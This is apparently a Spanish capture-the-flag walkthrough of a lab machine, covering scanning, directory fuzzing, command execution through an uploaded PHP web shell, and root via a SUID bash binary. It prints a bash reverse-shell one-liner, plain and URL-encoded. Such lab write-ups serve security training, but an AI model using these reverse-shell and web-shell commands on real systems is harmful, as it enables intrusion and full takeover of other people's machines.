---
icon: linux
---

**Plataforma:** The Hackers Labs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Gobuster` `Wfuzz` `RCE` `Web Shell` `SUID`

## INSTALACIÓN

Descargamos el archivo `zip` que contiene la `.ova` de la máquina Operación Pescador, lo extraemos y la importamos en VirtualBox.

Configuramos la interfaz de red de la máquina Operación Pescador y la iniciamos junto a nuestra máquina atacante.

## RECONOCIMIENTO DE HOSTS

En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:6f:3d:92      1      60  PCS Systemtechnik GmbH      
 10.0.4.39       08:00:27:80:8c:91      1      60  PCS Systemtechnik GmbH
```

Identificamos con seguridad que la `IP` de la víctima es `10.0.4.39`.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.39
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.39
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 23:29 +0100
Nmap scan report for 10.0.4.39
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.65
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: Did not follow redirect to http://mail.innovasolutions.thl/
MAC Address: 08:00:27:80:8C:91 (Oracle VirtualBox virtual NIC)
Service Info: Host: mail.innovasolutions.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

Identificamos los puertos `22` y `80` abiertos.

Para poder visualizar el contenido del servicio `HTTP`, primero tenemos que añadir el dominio `mail.innovasolutions.thl` al archivo `/etc/hosts`.

```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.39   mail.innovasolutions.thl
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Accedemos al puerto `80` y nos encontramos con un panel de `inicio de sesión` y un mensaje que nos indica que probablemente no podamos hacer `fuerza bruta`.

![](../../images/innovasolutions.png)

## GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://mail.innovasolutions.thl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mail.innovasolutions.thl
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1619]
/uploads              (Status: 301) [Size: 338] [--> http://mail.innovasolutions.thl/uploads/]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/forgot_password.php  (Status: 200) [Size: 1317]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
Progress: 252599 / 1543906 (16.36%)
```

Encontramos una carpeta `/uploads` con un tamaño de respuesta de 338. Accedemos y vemos el siguiente archivo:

![](../../images/pngphp.png)

El contenido parece ser el de una imagen, pero la extensión es `.php`.

## EXPLOTACIÓN (RCE)

Vamos a utilizar `Wfuzz` para intentar dar con un parámetro que nos permita un `LFI` (Local File Inclusion) o `RCE` (Remote Code Execution).

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id --hc 404 --hl 2
```

Info:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================

000005340:   200        3120 L   25661 W    677561 Ch   "cmd"
```

Encontramos el parámetro `cmd`, que nos devuelve un código de `estado 200`.

Modificamos la `URL` para incluir el comando `id`.

```
http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id
```

![](../../images/idrce.png)

¡Funciona! Tenemos ejecución remota de comandos.

El siguiente paso es obtener una `reverse shell` aprovechando el `RCE`.

Ponemos un `listener` en nuestra máquina atacante, pendiente de recibir la conexión.

```bash
sudo nc -nlvp 4444
```

A continuación, ejecutamos el siguiente one-liner de `Bash` desde el navegador:

```bash
...?cmd=bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
```

Aplicamos `URL encoding` para evitar problemas.

```bash
...?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%34%2e%31%32%2f%34%34%34%34%20%30%3e%26%31%27
```

Info:

```
listening on [any] 4444 ...
connect to [10.0.4.12] from (UNKNOWN) [10.0.4.39] 50076
bash: cannot set terminal process group (563): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ whoami
www-data
bash-5.2$
```

Al ejecutar, recibimos al instante la `shell` como el usuario `www-data`.

## TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de `TTY` para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

## ESCALADA DE PRIVILEGIOS

Comprobamos permisos `sudo` y `SUID`.

```bash
find / -perm -4000 -type f 2>/dev/null 
```

Info:

```
/usr/local/bin/get-report
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Vemos que tenemos el `bit SUID` activo en el binario `bash`, por lo que escalar a `root` es muy sencillo con el siguiente comando:

```bash
/bin/bash -p
```

Info:

```
bash-5.2# whoami
root
bash-5.2#
```

Ya somos root!

Por último, obtenemos las `flags` de usuario y root.

```
bash-5.2# cat /home/laptop/flag.txt
THL{FGF34DU-----ER!RDDLLK}
bash-5.2# cat /root/root.txt
THL{QOK44------LEDFFGBGH}
```
